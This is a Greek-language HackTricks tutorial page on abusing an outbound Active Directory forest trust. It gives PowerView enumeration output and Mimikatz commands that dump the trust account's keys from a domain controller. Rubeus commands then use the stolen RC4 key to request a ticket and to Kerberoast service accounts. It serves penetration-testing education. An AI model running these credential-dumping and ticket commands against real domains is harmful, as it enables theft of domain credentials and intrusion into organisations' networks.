# Εξωτερικό Δάσος Τομέας - Μονόδρομος (Εξερχόμενος)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

Σε αυτό το σενάριο, **ο τομέας σας** εμπιστεύεται **κάποια προνόμια** σε έναν αρχέτυπο από έναν **διαφορετικό τομέα**.

## Απαρίθμηση

### Εξερχόμενη Εμπιστοσύνη
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Επίθεση στον Λογαριασμό Εμπιστοσύνης

Υπάρχει μια ευπάθεια ασφάλειας όταν δημιουργείται μια σχέση εμπιστοσύνης μεταξύ δύο τομέων, που εδώ αναφέρονται ως τομέας **A** και τομέας **B**, όπου ο τομέας **B** επεκτείνει την εμπιστοσύνη του στον τομέα **A**. Σε αυτήν τη διάταξη, δημιουργείται ένας ειδικός λογαριασμός στον τομέα **A** για τον τομέα **B**, ο οποίος παίζει κρίσιμο ρόλο στη διαδικασία πιστοποίησης μεταξύ των δύο τομέων. Αυτός ο λογαριασμός, που σχετίζεται με τον τομέα **B**, χρησιμοποιείται για την κρυπτογράφηση εισιτηρίων για την πρόσβαση σε υπηρεσίες σε όλους τους τομείς.

Το κρίσιμο στοιχείο που πρέπει να κατανοήσουμε εδώ είναι ότι ο κωδικός πρόσβασης και το hash αυτού του ειδικού λογαριασμού μπορούν να εξαχθούν από έναν ελεγκτή τομέα στον τομέα **A** χρησιμοποιώντας ένα εργαλείο γραμμής εντολών. Η εντολή για να εκτελέσετε αυτήν την ενέργεια είναι:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Αυτή η εξαγωγή είναι δυνατή επειδή ο λογαριασμός, που αναγνωρίζεται με ένα **$** μετά το όνομά του, είναι ενεργός και ανήκει στην ομάδα "Domain Users" του τομέα **A**, κληρονομώντας έτσι τα δικαιώματα που συνδέονται με αυτήν την ομάδα. Αυτό επιτρέπει σε άτομα να πιστοποιηθούν εναντίον του τομέα **A** χρησιμοποιώντας τα διαπιστευτήρια αυτού του λογαριασμού.

**Προειδοποίηση:** Είναι εφικτό να εκμεταλλευτείτε αυτήν την κατάσταση για να αποκτήσετε πρόσβαση στον τομέα **A** ως χρήστης, αν και με περιορισμένα δικαιώματα. Ωστόσο, αυτή η πρόσβαση είναι αρκετή για να πραγματοποιηθεί απαρίθμηση στον τομέα **A**.

Σε ένα σενάριο όπου το `ext.local` είναι ο τομέας που εμπιστεύεται και το `root.local` είναι ο τομέας που εμπιστεύεται, θα δημιουργηθεί ένας λογαριασμός χρήστη με το όνομα `EXT$` εντός του `root.local`. Μέσω συγκεκριμένων εργαλείων, είναι δυνατό να ανακτηθούν οι κλειδιά εμπιστοσύνης Kerberos, αποκαλύπτοντας τα διαπιστευτήρια του `EXT$` στο `root.local`. Η εντολή για την επίτευξη αυτού είναι:
```bash
lsadump::trust /patch
```
Ακολουθώντας αυτό, μπορεί κανείς να χρησιμοποιήσει το εξαγόμενο κλειδί RC4 για να πιστοποιηθεί ως `root.local\EXT$` εντός του `root.local` χρησιμοποιώντας ένα άλλο εργαλείο εντολής:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Αυτό το βήμα πιστοποίησης ανοίγει τη δυνατότητα να απαριθμήσετε και ακόμα και να εκμεταλλευτείτε υπηρεσίες εντός του `root.local`, όπως να πραγματοποιήσετε μια επίθεση Kerberoast για να εξαγάγετε διαπιστευτήρια λογαριασμού υπηρεσίας χρησιμοποιώντας:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Συλλογή καθαρού κειμένου κωδικού εμπιστοσύνης

Στην προηγούμενη διαδικασία χρησιμοποιήθηκε το hash εμπιστοσύνης αντί για τον **καθαρό κείμενο κωδικό** (ο οποίος επίσης **ανακτήθηκε από το mimikatz**).

Ο καθαρός κείμενος κωδικός μπορεί να αποκτηθεί μετατρέποντας την έξοδο \[ CLEAR ] από το mimikatz από δεκαεξαδική μορφή και αφαιρώντας τα μηδενικά bytes ‘\x00’:

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Μερικές φορές, κατά τη δημιουργία μιας σχέσης εμπιστοσύνης, ο χρήστης πρέπει να πληκτρολογήσει έναν κωδικό για την εμπιστοσύνη. Σε αυτήν την επίδειξη, το κλειδί είναι ο αρχικός κωδικός εμπιστοσύνης και επομένως αναγνώσιμος από ανθρώπους. Καθώς το κλειδί αλλάζει (κάθε 30 ημέρες), ο καθαρός κείμενος δεν θα είναι αναγνώσιμος από ανθρώπους, αλλά τεχνικά ακόμα χρήσιμος.

Ο καθαρός κείμενος κωδικός μπορεί να χρησιμοποιηθεί για να πραγματοποιηθεί κανονική πιστοποίηση ως λογαριασμός εμπιστοσύνης, μια εναλλακτική λύση για την αίτηση ενός TGT χρησιμοποιώντας το μυστικό κλειδί Kerberos του λογαριασμού εμπιστοσύνης. Εδώ, ερωτώντας το root.local από το ext.local για τα μέλη των Domain Admins:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Αναφορές

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
